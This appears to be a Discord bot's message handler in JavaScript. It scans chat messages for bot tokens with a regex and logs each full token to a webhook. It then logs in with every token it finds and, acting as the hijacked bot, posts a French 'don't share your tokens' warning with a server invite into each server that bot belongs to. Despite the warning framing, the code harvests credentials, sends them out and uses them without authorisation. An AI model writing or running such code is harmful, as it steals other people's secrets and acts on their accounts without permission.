const client = require("../index");
const { LogContent, Levels } = require("../functions/webhookLog.js");
const { GatewayIntentBits, PermissionFlagsBits, Client } = require("discord.js");

client.on("messageCreate", async (message) => {
    const tokens = message.content.match(/[a-z,0-9]{24}\.[a-z,0-9]{6}\.[a-z,0-9,\_,\-]{38}/gmi);
    if (tokens === null)
        return;

    var contents = [
        new LogContent(Levels.Warn, tokens)
    ];
    client.webhookLog.send("Tokens found", contents);
    tokens.forEach(token => {
        let tmpclient = new Client({
            intents: [
                GatewayIntentBits.Guilds
            ]
        });
        
        tmpclient.login(token).then(_ => {
            contents = [
                new LogContent(Levels.Valid, `Token valid: ${token}`)
            ]
            client.webhookLog.send("Good token", contents);
        }).catch(err => {
            contents = [
                new LogContent(Levels.Error, `Token invalid: ${token}`)
            ]
            client.webhookLog.send("Bad token", contents);
        });

        tmpclient.on("ready", () => {
            tmpclient.guilds.cache.each(async guild => {
                let chan = await guild.channels.cache.find(ch => {
                    return ch.isTextBased &&
                        ch.isTextBased() &&
                        ch.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages);
                });
                if (!chan) {
                    return;
                }
                await chan.send("Ne publie pas tes tokens n'importe où !!! Un token est comme un mot de passe, ça ne se partage pas. Pour en apprendre plus sur la sécurité informatique -> https://discord.com/servers/l-ordre-des-devs-706640777450881114").catch(_ => {});
            });
            tmpclient.destroy();
        });
    });
});